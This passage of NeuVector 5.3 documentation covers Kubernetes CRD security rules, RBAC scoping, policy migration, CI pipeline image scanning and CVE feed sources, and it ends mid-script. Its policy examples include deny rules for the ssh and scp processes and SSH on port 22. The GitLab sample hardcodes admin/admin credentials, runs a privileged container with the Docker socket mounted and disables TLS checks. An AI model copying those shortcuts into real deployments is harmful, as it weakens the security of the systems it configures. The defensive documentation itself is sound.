ActiveMQApacheCassandraConsulCouchbaseCouchDBDHCPDNSEchoElasticSearchetcdGRPCHTTPJettyKafkaMemcachedMongoDBMSSQLMySQLnginxNTPOraclePostgreSQLRabbitMQRadiusRedisRTSPSIPSparkSSHSSLSyslogTFTPVoltDBWordpressZooKeeper Port - The specified format is xxx/yyy. Where xxx=protocol(tcp, udp), and yyy=port_number (0-65535). TCP/123 or TCP/anyUDP/123 or UDP/123ICMP123 = TCP/123 Process - A list of process with action, name, path for each action: allow/deny #This action has precedence over the file access rule. This should be set to allow if the intent is to allow the file access rule to take effect.name: process namepath: process path (optional) File - A list of file access rules; these apply only to the defined target container group app: list of appsbehavior: block_access / monitor_change #This blocks access to the defined filter below. If monitor_change is chosen, then a security-event will be generated from the NeuVector’s webconsole Notifications &gt; Security events page.filter: path/filenamerecursive: true/false  ","version":"5.3","tagName":"h3"},{"title":"RBAC Support with CRDs​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/policy/usingcrd#rbac-support-with-crds","content":" Utilizing Kubernetes existing RBAC model, NeuVector extends the CRD (Custom Resource Definition) to support RBAC by utilizing Kubernetes’s Rolebinding in association with the configured Namespace in the NeuVector configured CRD rules when using the NvSecurityRule resource-type. This configured Namespace is then used to enforce the configured Target, which must reside in this namespace configured in the NeuVector security policy. When rolebinding a defined clusterrole, this can be used to bind to a Kubernetes User or Group. The two clusterrole resources types that NeuVector supports are NvSecurityRule and NvClusterSecurityRule.  Rolebinding &amp; Clusterolebinding with 2 Users in different Namespaces to a Clusterrole (NvSecurityRules &amp; NvClusterSecurityRules resources)  The following illustrates a scenario creating one Clusterrole containing both resources (NvSecurityRules and NvClusterSecurityRules) to be bound to two different users.  One user (user1) belongs to Namespace (ns1), while the other user (user2) belongs to Namespace (ns2). User1 will Rolebind to this created Clusterrole (nvsecnvclustrole), while User2 is Clusterrolebind to this same Clusterrole (nvsecnvclustrole).  The key takeaway here is to illustrate that using Rolebinding, this will have Namespace-Level-Scope, whereas using Clusterrolebinding will have Cluster-Level-Scope. User1 will Rolebind (Namespace-Level-Scope), and User2 will be Clusterrolebind (Cluster-Level-Scope). This matters most during RBAC enforcement based on the scope-level that bounds the created users access.  Example using 2 different types of defined yaml files, and the effect of using each user  Create a Clusterrole containing both NvSecurityRules and NvClusterSecurityRules resources. Note: Notice that this clusterrole has 2 resources configured, nvsecurityrules and nvclustersecurityrules. Example (nvsecnvclustroles.yaml):  apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: nvsecnvclustrole rules: - apiGroups: - neuvector.com resources: - nvsecurityrules - nvclustersecurityrules verbs: - list - delete - create - get - update - apiGroups: - apiextensions.k8s.io resources: - customresourcedefinitions verbs: - get - list   Create 2 test yaml-files. One for the NvSecurityRules, and the other for the NvClusterSecurityRules resource. Sample NvSecurityRules nvsecurity.yaml file:  apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ns1crd namespace: ns1 spec: target: selector: name: nv.nginx-pod.ns1 criteria: - key: service value: nginx-pod.ns1 op: &quot;=&quot; - key: domain value: ns1 op: &quot;=&quot; ingress: - selector: name: ingress criteria: - key: domain value: demo op: &quot;=&quot; ports: &quot;tcp/65535&quot; applications: - SSL action: allow name: ingress   Sample NvClusterSecurityRules nvclustersecurity.yaml file:  apiVersion: neuvector.com/v1 kind: NvClusterSecurityRule metadata: name: rbacnvclustmatchnamespacengtargserving namespace: nvclusterspace spec: target: policymode: Protect selector: name: nv.nginx-pod.eng criteria: - key: service value: nginx-pod.eng op: &quot;=&quot; - key: domain value: eng op: &quot;=&quot; ingress: - selector: name: ingress criteria: - key: service value: nginx-pod.demo op: &quot;=&quot; ports: &quot;tcp/65535&quot; applications: - SSL action: allow name: ingress   Switching the user-context to user1 (belongs to the ns1 Namespace) has a Rolebind to the NvSecurityRules resource, who is Namespace bound to the Namespace ns1. Therefore, importing test yaml file (kubectl create –f nvsecurity.yaml should be allowed since this yaml file configuration has the NvSecurityRules resource and the Namespace that this user is bound to.  If there is an attempt to import the test yaml file (nvclustersecurity.yaml ) however, this will be denied since the import CRD yaml file is defined with the resource NvClusterSecurityRules that has a Cluster-Scope, but user1 was Rolebind with a Namespace-Scope. Namespace-scope has a lower privilege than Cluster-Scope. Therefore, Kubernetes RBAC will deny such a request.  Example Error Message:  Error from server (Forbidden): error when creating &quot;rbacnvclustnamespacengtargnvclustingress.yamltmp&quot;: nvclustersecurityrules.neuvector.com is forbidden: User &quot;user1&quot; cannot create resource &quot;nvclustersecurityrules&quot; in API group &quot;neuvector.com&quot; at the cluster scope   Next, we can switch the user-context to user2 with a broader scope privilege, cluster-level-scope. This user2 has a Clusterrolebinding that is not Namespace bound, but has a cluster-level-scope, and associates with the NvClusterSecurityRules resource.  Therefore, using user2 to import either yaml file (nvsecurity.yaml or nvclustersecurity.yaml) will be allowed, since this user’s Clusterrolebinding is not restricted to either resource NvSecurityRules (Namespace-Scope) or NvClusterSecurityRules (Cluster-Scope).  ","version":"5.3","tagName":"h3"},{"title":"Expressing Network Rules (Ingress, Egress objects) in CRDs​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/policy/usingcrd#expressing-network-rules-ingress-egress-objects-in-crds","content":" Network rules expressed in CRDs have an Ingress and/or Egress object, which define the allowed incoming and outgoing connections (protocols, ports etc) to/from the workload (Group). Each network rule in NeuVector must have a unique name in a CRD. Note that in the console, network rules only have a unique ID number.  If the 'To' (destination) of the rule is a learned, discovered group, upon export NeuVector prepends the 'nv.' identifier to the name. For example &quot;nv.redis-master.demo-ingress-0&quot;. For both discovered and custom groups, NeuVector also appends a unique name identifier, such as '-ingress-0' in the rule name 'nv.redis-master.demo-ingress-0. For CRD rule names, the 'nv.' identifier is NOT required, and is added to exported rules for clarity. For example:   ingress: - action: allow applications: - Redis name: nv.redis-master.demo-ingress-0   Custom, user created groups are not allowed to have the 'nv.' prefix. Only discovered/learned groups with the domain and service objects should have the prefix. For example:   - action: allow applications: - HTTP name: nv.node-pod.demo-egress-1 ports: any priority: 0 selector: comment: &quot;&quot; criteria: - key: service op: = value: node-pod.demo - key: domain op: = value: demo name: nv.node-pod.demo   ","version":"5.3","tagName":"h3"},{"title":"Customized Configurations for Deployed Applications​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/policy/usingcrd#customized-configurations-for-deployed-applications","content":" With the use of a customized CRD yaml file, this enables you to customize network security rules, file access rules, and process security rules, all bundled into a single configuration file. There are multiple benefits to allow these customizations.  First, this allows the same rules to be applied on multiple Kubernetes environments, allowing synchronization among clusters.Second, this allows preemptive rules deployment prior to the applications coming online, which provides a proactive and effective security rules deployment workflow.Third, this allows the policymode to change from an evaluation one (such as Discover or Monitor), to one that protects the final staging environment.  These CRD rules within a yaml file can be imported into the NeuVector security platform through the use of Kubernetes CLI commands such as 'kubectl create –f crd.yaml'. This empowers the security team to tailor the security rules to be applied upon various containers residing in the Kubernetes environment.  For example, a particular yaml file can be configured to enable the policymode to Discover or Monitor a particular container named nv.alpine.ns1 in a staging cluster environment. Moreover, you can limit ssh access for a configured target container nv.alpine.ns1. to another container nv.redhat.ns2.  Once all the necessary tests and evaluations of such security rules are deemed correct, then you can migrate this to a production cluster environment simultaneous to the application deployments by using the NeuVector policy migration feature, which will be discussed later in this section.  Examples of CRD configurations that perform these functions  The following is a sample snippet of such configurations  apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ns1global namespace: ns1 #The target's native namespace spec: target: selector: name: nv.alpine.ns1 criteria: - key: service value: alpine.ns1 #The source target's running container op: &quot;=&quot; - key: domain value: ns1 op: &quot;=&quot; egress: - selector: name: egress criteria: - key: service value: nv.redhat.ns2 #The destination's running container op: &quot;=&quot; ports: tcp/22 #Denies ssh to the destination container nv.redhat.ns2 applications: - SSH action: deny name: egress file: #Applies only to the defined target container group - app: - chmod #The application chmod is the only application allowed to access, while all other apps are denied. behavior: block_access #Supported values are block_access and monitor_change. This blocks access to the defined filter below. filter: /tmp/passwd.txt recursive: false process: - action: allow #This action has precedence over the file access rule. This should be allowed if the intent is to allow the file access rule to take effect. name: chmod # This configured should match the application defined under the file section. path: /bin/chmod   The above snippet is configured to enforce ssh access from the target group container nv.alpine.ns1 to the egress group nv.redhat.ns2. In addition, the enforcement of file access and the process rules are defined and applied to the configured target container nv.alpine.ns1. With this bundled configuration, we have allowed the defined network, file, and process security rules to act upon the configured target group.  ","version":"5.3","tagName":"h3"},{"title":"Policy Groups and Rules Migration Support​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/policy/usingcrd#policy-groups-and-rules-migration-support","content":" NeuVector supports the exporting of certain NeuVector group types from a Kubernetes cluster in a yaml file and importing into another Kubernetes cluster by utilizing native kubectl commands.  Migration Use Cases  Export tested CRD groups and security rules that are deemed “production ready” from a staging k8s cluster environment to a production k8s cluster environment.Export learned security rules to be migrated from a staging k8s environment to a production k8s environment.Allow the modification of the policymode of a configured Target group, for instance, such as Discover or Monitor mode in a staging environment, to Protect mode in a production environment.  Supported Export Conditions  Target, Ingress, Egress, Self-learned  Example of groups export  Exported groups with a configured attribute as domain=xx are exported with the Resource-Type NvsecurityRule along with the namespace.    Example of an exported group yaml file with the NvsecurityRule resource type   kind: NvSecurityRule metadata: name: nv.nginx-pod.neuvector namespace: neuvector spec: egress: [] file: [] ingress: [] process: [] target: selector: criteria: - key: service op: = value: nginx-pod.neuvector - key: domain op: = value: neuvector name: nv.nginx-pod.neuvector policymode: Discover   Exported groups without the defined criteria as domain=xx (Namespace) are exported with a Resource-Type NvClusterSecurityRule and a Namespace as default. Examples of Exported groups without a Namespace are external, container, etc.  Example of an exported group yaml file with the NvClusterSecurityRule resource type   kind: NvClusterSecurityRule metadata: name: egress namespace: default spec: egress: [] file: #File path profile applicable to the Target group only, and only applies to self-learned and user create groups - app: - vi - cat behavior: block_access filter: /etc/mysecret #Only vi and cat can access this file with “block_access”. recursive: false ingress: - selector: criteria: - key: service op: = value: nginx-pod.neuvector - key: domain op: = value: neuvector name: nv.nginx-pod.neuvector #Group Name action: allow applications: - Apache - ElasticSearch name: egress-ingress-0 #Policy Name ports: tcp/9400 process: #Process profile applicable to the Target group only, and only applies to self-learned and user create groups. - action: deny #Possible values are deny and allow name: ls path: /bin/ls #This example shows it denies the ls command for this target. target: selector: criteria: - key: service op: = value: nginx-pod.demo name: egress #Group Name policymode: null - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ingress namespace: demo spec:   note The CRD import behavior ignores the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration.  Unsupported Export Group-Types  FederatedIP-Based (unsupported for learned service IP only, custom user created IP groups are supported)  Import Scenarios  The import will create new groups in the destination system if the groups do not yet exist in the destination environment, and the currently used Kubernetes user-context has the necessary permissions to access the namespaces configured in the CRD-yaml file to be imported.If the imported group exists in the destination system with different criteria or values, the import will be rejected.If the imported group exists in the destination system with identical configurations, we will reuse the existing group with different type.  ","version":"5.3","tagName":"h3"},{"title":"CRD Samples for Global Rules​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/policy/usingcrd#crd-samples-for-global-rules","content":" The sample CRD below has two parts:  The first part is a NvClusterSecurityRule for the group named containers: The target for this NvClusterSecurityRule is all containers. It has an ingress policy that does not allow any external connections (outside your cluster) to ssh into your containers. It also denies all containers from using the ssh process. This defined global behavior applies to all containers. The second part is a NvSecurityRule for alpine services: The target is a service called nv.alpine.default in the 'default' namespace. Because it belongs to the all containers, it will inherit the above network policy and process rule. It also adds rules that don't not allow connections of HTTP traffic through port 80 to an external network. Also it not allow the running of the scp process.  Note that for service nv.alpine.default (defined as nv.xxx.yyy where xxx is the service name like alpine, yyy is the namespace like default) we can define policy mode that it is set to. Here it is defined as Protect mode (blocking all abnormal activity).  Overall since nv.alpine.defult is in protect mode, it will deny containers from running ssh and scp, and also will deny ssh connections from external or http to external.  If you change the nv.alpine.defult policymode to monitor, then NeuVector will just log it when scp/ssh is invoked, or there are ssh connections from external or http to external.  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvClusterSecurityRule metadata: name: containers namespace: default spec: egress: [] file: [] ingress: - selector: criteria: [] name: external action: deny applications: - SSH name: containers-ingress-0 ports: tcp/22 process: - action: deny name: ssh path: /bin/ssh target: selector: criteria: - key: container op: = value: '*' name: containers policymode: null - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.alpine.default namespace: default spec: egress: - selector: criteria: [] name: external action: deny applications: - HTTP name: external-egress-0 ports: tcp/80 file: [] ingress: [] process: - action: deny name: scp path: /bin/scp target: selector: criteria: - key: service op: = value: alpine.default - key: domain op: = value: default name: nv.alpine.default policymode: Protect kind: List metadata: null   To allow, or whitelist a process such as a monitoring process to run, just add a process rule with action: allow for the process name, and add the path. The path must be specified for allow rules but is optional for deny rules.  ","version":"5.3","tagName":"h3"},{"title":"Updating CRD Rules and Adding to Existing Groups​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/policy/usingcrd#updating-crd-rules-and-adding-to-existing-groups","content":" Updating the CRD generated rules in NeuVector is as simple as updating the appropriate yaml file and applying the update:  kubectl apply -f &lt;crdrule.yaml&gt;   Dynamic criteria support for NvClusterSecurityRule​  Multiple CRDs which change the criteria for existing custom group(s) are supported. This feature also allows the user to apply multiple CRDs at once, where the NeuVector behavior is to accept and queue the CRD so the immediate response to the user is always success. During processing, any errors are reported into the console Notifications -&gt; Events. ","version":"5.3","tagName":"h3"},{"title":"Vulnerability Scanning, Compliance Testing, and Admission Controls","type":0,"sectionRef":"#","url":"/scanning","content":"Vulnerability Scanning, Compliance Testing, and Admission Controls Full Lifecycle Image and Container Scanning, CIS Benchmarks for Security, and Compliance","keywords":"","version":"5.3"},{"title":"Build Phase Image Scanning","type":0,"sectionRef":"#","url":"/scanning/build","content":"","keywords":"","version":"5.3"},{"title":"CI/CD Build Phase Vulnerability Scanning​","type":1,"pageTitle":"Build Phase Image Scanning","url":"/scanning/build#cicd-build-phase-vulnerability-scanning","content":" Scan for vulnerabilities during the build phase of the pipeline using plug-ins such as Jenkins, Azure Devops, Github Action, gitlab, Bamboo, and CircleCI, or use the REST API. NeuVector supports two types of build-phase scanning: registry and local. For registry scanning, the NeuVector controller and scanner must be able to connect to the registry to pull the image.  To trigger a build-phase scan, the plug-in (e.g. Jenkins) must be able to connect to the Controller or Allinone. Note: The default REST API port for plug-ins to call the scanner is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  Make sure there is a NeuVector scanner container deployed and properly configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separately from the allinone or controller, and is included in the sample deployment yaml files.  You can download the plug-in from the Jenkins Plug-in Manager. Other plug-ins are accessible through the catalogs of the build tool, or on the NeuVector github page. The Bamboo scanner is available at https://github.com/neuvector/bamboo-plugin/releases/tag/1.0.1. The CircleCI ORB is available at https://github.com/neuvector/circleci-orb and through the CircleCI ORB catalog.  Local Build-Phase Scanning​  For local scanning, the NeuVector scanner will try to scan the image on a local host (or a host reachable by the remote host docker command).  For Kubernetes or OpenShift-based local scanning, remove the commented-out section of the sample scanner deployment yaml file, shown in the Deploying NeuVector sections. The commented out section looks like this:   env: # Commented out sections are required only for local build-phase scanning # - name: SCANNER_DOCKER_URL # value: tcp://192.168.1.10:2376 - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP # volumeMounts: # - mountPath: /var/run/docker.sock # name: docker-sock # readOnly: true # volumes: # - name: docker-sock # hostPath: # path: /var/run/docker.sock restartPolicy: Always   For Docker-native local scanning, follow the instructions for Docker scanner deployments in the Docker Production deployments section for the scanner.  Local Build-Phase Scanning - Scanner Only (No Controller Required)​  NeuVector supports standalone scanner deployments for local image scanning (which does not require a Controller). Certain plug-in's such as the CircleCI ORB have an option to dynamically deploy a scanner when a build job requires image scanning, then remove the scanner when the results are sent back through the ORB. These dynamic scanner deployments are automatically invoked through the plug-in if supported.  Please see the scanner section for more details on stand alone scanners. ","version":"5.3","tagName":"h3"},{"title":"Azure DevOps","type":0,"sectionRef":"#","url":"/scanning/build/azuredevops","content":"","keywords":"","version":"5.3"},{"title":"Scan for Vulnerabilities in the Azure DevOps Build Pipeline​","type":1,"pageTitle":"Azure DevOps","url":"/scanning/build/azuredevops#scan-for-vulnerabilities-in-the-azure-devops-build-pipeline","content":" The NeuVector scanner can be triggered from the Azure DevOps pipeline by using the NeuVector extension published in the Azure DevOps Marketplace.    The extension supports both remote and local scanning where the NeuVector controller can remotely scan an image in a registry during the build, or dynamically start a local controller to scan the image on the Azure agent vm.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Scan image with NeuVector task integrates the NeuVector vulnerability scanner into an Azure DevOps Pipeline.Perform vulnerability scans of a container image after the image build on an external NeuVector controller instance or on a local NeuVector controller instance which is running in service container inside a pipeline.Define thresholds for failing builds based on the number of detected vulnerabilities of different severities.Provide a detailed report of an image scan for analysis in the build summary tab.External NeuVector controller instances are defined as service endpoints to decouple build pipeline definitions from connection parameters and credentials.  An overview with sample screens can be found at https://marketplace.visualstudio.com/items?itemName=NeuVector.neuvector-vsts ","version":"5.3","tagName":"h3"},{"title":"Bamboo","type":0,"sectionRef":"#","url":"/scanning/build/bamboo","content":"","keywords":"","version":"5.3"},{"title":"Scan for Vulnerabilities during Bamboo Build Pipeline​","type":1,"pageTitle":"Bamboo","url":"/scanning/build/bamboo#scan-for-vulnerabilities-during-bamboo-build-pipeline","content":" The Bamboo plug-in for NeuVector can be used to scan for vulnerabilities in the Bamboo pipeline. The plug-in can be downloaded from the Admin -&gt; Add-ons menu in Bamboo. Use Find New Apps to search for NeuVector. The plug-in is also described in the Atlassian Marketplace.  Deploy the NeuVector Allinone or Controller container if you haven't already done so on a host reachable by Bamboo. Make a note of the IP address of the host where the Allinone or Controller is running.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Configure Global Settings​  Configure settings for the NeuVector Controller/Allinone including the NeuVector authentication as well as the registry authentication.  Configure the Repository and Build Policy​  Create a task and enter the repository and tag to scan as well as the build policy to fail the build if vulnerabilities are detected. Enable layered scanning if the results should contain an analysis of vulnerabilities for each layer in the image.  Review Results​  Review the results in the scan logs, including the scan summary, reason for failing if appropriate, and details for each CVE detected. ","version":"5.3","tagName":"h3"},{"title":"CircleCI","type":0,"sectionRef":"#","url":"/scanning/build/circleci","content":"","keywords":"","version":"5.3"},{"title":"Scan for Vulnerabilities in the CircleCI Build Pipeline​","type":1,"pageTitle":"CircleCI","url":"/scanning/build/circleci#scan-for-vulnerabilities-in-the-circleci-build-pipeline","content":" The NeuVector CircleCI ORB triggers a vulnerability scan on an image in the CircleCI pipeline. The ORB is available in the CircleCI catalog and is also documented on the NeuVector GitHub page.  Deploy the NeuVector Allinone or Controller container if you haven't already done so on a host reachable by the CircleCI ORB. Make a note of the IP address of the host where the Allinone or Controller is running.  The ORB supports two use cases:  Triggering the scan to be performed outside the CirclCI infrastructure. The ORB contacts the NeuVector scanner, which then pulls the image from a registry to be scanned. Make sure the ORB has network connectivity to the host where the NeuVector Controller/Allinone is running.Dynamically launching a NeuVector controller and scanner on a temporary vm running on the CircleCI platform. After launching and auto-configuring, the scan be done on image in the build, and after completion the NeuVector deployment is stopped and removed. For this use case, please see the documentation on the CircleCI ORB for NeuVector.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Create a Context in Your CircleCI App​    Configure Settings​  Configure the Environment Variables for Connecting to and Authenticating    Add the NeuVector orb to Your Build config.yaml  version: 2.1 orbs: neuvector: neuvector/neuvector-orb@1.0.0 workflows: scan-image: jobs: - neuvector/scan-image: context: myContext registry_url: https://registry.hub.docker.com repository: alpine tag: &quot;3.4&quot; scan_layers: false high_vul_to_fail: 0 medium_vul_to_fail: 3   The registry_url is the location to find the image to be scanned. Configure the repository name, tag, and if a layered scan should be performed. Add criteria for the build task to fail based on number of high or medium vulnerabilities detected.  Review the Results​  The build task will pass or fail based on the criteria set. In either case you can review the full scan report. ","version":"5.3","tagName":"h3"},{"title":"GitHub","type":0,"sectionRef":"#","url":"/scanning/build/github","content":"","keywords":"","version":"5.3"},{"title":"Scan for Vulnerabilities in a GitHub Action Pipeline​","type":1,"pageTitle":"GitHub","url":"/scanning/build/github#scan-for-vulnerabilities-in-a-github-action-pipeline","content":" The NeuVector scanner can be triggered from a GitHub Action pipeline by using the NeuVector Vulnerability Scan Actionpublished in the GitHub Action Marketplace.   ","version":"5.3","tagName":"h3"},{"title":"CVE Database Sources & Version","type":0,"sectionRef":"#","url":"/scanning/cve_sources","content":"","keywords":"","version":"5.3"},{"title":"NeuVector Vulnerability (CVE) Database​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/scanning/cve_sources#neuvector-vulnerability-cve-database","content":" The NeuVector vulnerability database is updated nightly with sources from popular container base images and package providers. These updates are automatically built into the updater container and published to the NeuVector private docker hub registry. The list of sources included is evaluated frequently to ensure the accuracy of scan results.  note You control when to update the CVE database in your deployment. Please see the section Updating the CVE Database for details on how to update.  important NeuVector is able to scan distroless and PhotonOS based images.  ","version":"5.3","tagName":"h3"},{"title":"CVE Database Version​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/scanning/cve_sources#cve-database-version","content":" The CVE database version and date can be seen in the console in the Platforms, Registries, Vulnerabilities tab in Containers/Nodes in Assets, and Risk Reports Scan Events.  To use the REST API to query the version:  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://127.0.0.1:10443/v1/scan/scanner&quot;   Output:  { &quot;scanners&quot;: [ { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;0f043705948557828ac1831ee596588a0d050950113117ddd19ecd604982f4d9&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;127.0.0.1&quot; }, { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;9fa02c644d603f59331c95735158d137002d32a75ed1014326f5039f38d4d717&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;192.168.9.95&quot; } ] }   To query the NeuVector scanner for the database version:  kubectl exec &lt;scanner pod&gt; -n neuvector -- scanner -v -d /etc/neuvector/db/   To use docker commands:  docker exec scanner scanner -v -d /etc/neuvector/db/   ","version":"5.3","tagName":"h3"},{"title":"Querying the CVE Database for Specific CVE Existence​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/scanning/cve_sources#querying-the-cve-database-for-specific-cve-existence","content":" An online service is provided for NeuVector Prime (paid subscription) customers to be able to query the CVE database to determine if a specific CVE exists in the current database version. Other CVE database queries are also available from this service. Please request access through your SUSE Support portal (SCC), SUSE Collective link, or contact your SUSE account representative to access this service.  ","version":"5.3","tagName":"h3"},{"title":"CVE Database Sources​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/scanning/cve_sources#cve-database-sources","content":" The most up-to-date list of CVE database sources can be found here  Sources include:  General CVE Feeds​  Source\tURLnvd and Mitre\thttps://nvd.nist.gov/feeds/json/cve/1.1  note NVD is a superset of CVE https://cve.mitre.org/about/cve_and_nvd_relationship.html  OS CVE Feeds​  Source\tURLalpine\thttps://secdb.alpinelinux.org/ amazon\thttps://alas.aws.amazon.com/ debian\thttps://security-tracker.debian.org/tracker/data/json Microsoft mariner\thttps://github.com/microsoft/CBL-MarinerVulnerabilityData Oracle\thttps://linux.oracle.com/oval/ Rancher OS\thttps://rancher.com/docs/os/v1.x/en/about/security/ redhat\thttps://www.redhat.com/security/data/oval/v2/ SUSE linux\thttps://ftp.suse.com/pub/projects/security/oval/ ubuntu\thttps://launchpad.net/ubuntu-cve-tracker  Application Based Feeds​  Source\tURL.NET\thttps://github.com/advisories, https://www.cvedetails.com/vulnerability-list/vendor_id-26/ apache\thttps://www.cvedetails.com/vendor/45/Apache.html busybox\thttps://www.cvedetails.com/vulnerability-list/vendor_id-4282/Busybox.html golang\thttps://github.com/advisories java\thttps://openjdk.java.net/groups/vulnerability/advisories/ github maven\thttps://github.com/advisories?query=maven kubernetes\thttps://kubernetes.io/docs/reference/issues-security/official-cve-feed/ nginx\thttp://nginx.org/en/security_advisories.html npm/nodejs\thttps://github.com/advisories?query=ecosystem%3Anpm python\thttps://github.com/pyupio/safety-db openssl\thttps://www.openssl.org/news/vulnerabilities.html ruby\thttps://github.com/rubysec/ruby-advisory-db  ","version":"5.3","tagName":"h3"},{"title":"Scanner Accuracy​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/scanning/cve_sources#scanner-accuracy","content":" NeuVector evaluates each source to determine how to most accurately scan for vulnerabilities. It is common for scan results from different vendors' scanners to return different results. This is because each vendor processes the sources differently.  A higher number of vulnerabilities detected by one scanner is not necessarily better than another. This is because there can be false positives which return inaccurate vulnerability results.  NeuVector supports both layered and non-layered (compacted) scan results for images. The layered scan shows vulnerabilities in each layer, while the non-layered shows only vulnerabilities at the surface.  ","version":"5.3","tagName":"h3"},{"title":"Scanner Performance​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/scanning/cve_sources#scanner-performance","content":" A number of factors determine scanner performance. For registry scanning, the number and size of images as well as if a layered scan is being performed will determine performance. For run-time scans, the collection of container data is distributed across all Enforcers, then scheduled by the Controller for database comparison.  Multiple parallel scanners can be deployed to increase scan performance for a large number of images. The controller will schedule scan tasks across all scanners. Each scanner is a container which is deployed by a Kubernetes deployment/replicaset. ","version":"5.3","tagName":"h3"},{"title":"Gitlab","type":0,"sectionRef":"#","url":"/scanning/build/gitlab","content":"","keywords":"","version":"5.3"},{"title":"Scan for Vulnerabilities during Gitlab Build Pipeline​","type":1,"pageTitle":"Gitlab","url":"/scanning/build/gitlab#scan-for-vulnerabilities-during-gitlab-build-pipeline","content":" NeuVector can be configured to scan for vulnerabilities triggered in the Gitlab build pipeline. There is a Gitlab plug-in here which can be configured and used. Please follow the instructions on the gitlab site for using the plugin.  The scan can also use the NeuVector REST API by configuring the provided script below to access the controller.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Scan During Gitlab Build Using REST API​  Use the following script, configured for your NeuVector login credentials to trigger the vulnerability scans.  ######################## # Scanning Job ######################## NeuVector_Scan: image: docker:latest stage: test #the runner tag name is nv-scan tags: - nv-scan services: - docker:dind before_script: - apk add curl - apk add jq variables: DOCKER_DAEMON_PORT: 2376 DOCKER_HOST: &quot;tcp://$CI_SERVER_HOST:$DOCKER_DAEMON_PORT&quot; #the name of the image to be scanned NV_TO_BE_SCANNED_IMAGE_NAME: &quot;nv_demo&quot; #the tag of the image to be scanned NV_TO_BE_SCANNED_IMAGE_TAG: &quot;latest&quot; #for local, set NV_REGISTRY=&quot;&quot; #for remote, set NV_REGISTRY=&quot;[registry URL]&quot; NV_REGISTRY_NAME: &quot;&quot; #the credential to login to the docker registry NV_REGISTRY_USER: &quot;&quot; NV_REGISTRY_PASSWORD: &quot;&quot; #NeuVector image location NV_IMAGE: &quot;10.1.127.3:5000/neuvector/controller&quot; NV_PORT: 10443 NV_LOGIN_USER: &quot;admin&quot; NV_LOGIN_PASSWORD: &quot;admin&quot; NV_LOGIN_JSON: '{&quot;password&quot;:{&quot;username&quot;:&quot;$NV_LOGIN_USER&quot;,&quot;password&quot;:&quot;$NV_LOGIN_PASSWORD&quot;}}' NV_SCANNING_JSON: '{&quot;request&quot;:{&quot;registry&quot;:&quot;$NV_REGISTRY&quot;,&quot;username&quot;:&quot;$NV_REGISTRY_NAME&quot;,&quot;password&quot;:&quot;$NV_REGISTRY_PASSWORD&quot;,&quot;repository&quot;:&quot;$NV_TO_BE_SCANNED_IMAGE_NAME&quot;,&quot;tag&quot;:&quot;$NV_TO_BE_SCANNED_IMAGE_TAG&quot;}}' NV_API_AUTH_URL: &quot;https://$CI_SERVER_HOST:$NV_PORT/v1/auth&quot; NV_API_SCANNING_URL: &quot;https://$CI_SERVER_HOST:$NV_PORT/v1/scan/repository&quot; script: - echo &quot;Start neuvector scanner&quot; - docker run -itd --privileged --name neuvector.controller -e CLUSTER_JOIN_ADDR=$CI_SERVER_HOST -p 18301:18301 -p 18301:18301/udp -p 18300:18300 -p 18400:18400 -p $NV_PORT:$NV_PORT -v /var/neuvector:/var/neuvector -v /var/run/docker.sock:/var/run/docker.sock -v /proc:/host/proc:ro -v /sys/fs/cgroup/:/host/cgroup/:ro $NV_IMAGE - | _COUNTER_=&quot;0&quot; while [ -z &quot;$TOKEN&quot; -a &quot;$_COUNTER_&quot; != &quot;12&quot; ]; do _COUNTER_=$((( _COUNTER_ + 1 ))) sleep 5 TOKEN=`(curl -s -f $NV_API_AUTH_URL -k -H &quot;Content-Type:application/json&quot; -d $NV_LOGIN_JSON || echo null) | jq -r '.token.token'` if [ &quot;$TOKEN&quot; = &quot;null&quot; ]; then TOKEN=&quot;&quot; fi done - echo &quot;Scanning ...&quot; - sleep 20 - curl $NV_API_SCANNING_URL -s -k -H &quot;Content-Type:application/json&quot; -H &quot;X-Auth-Token:$TOKEN&quot; -d 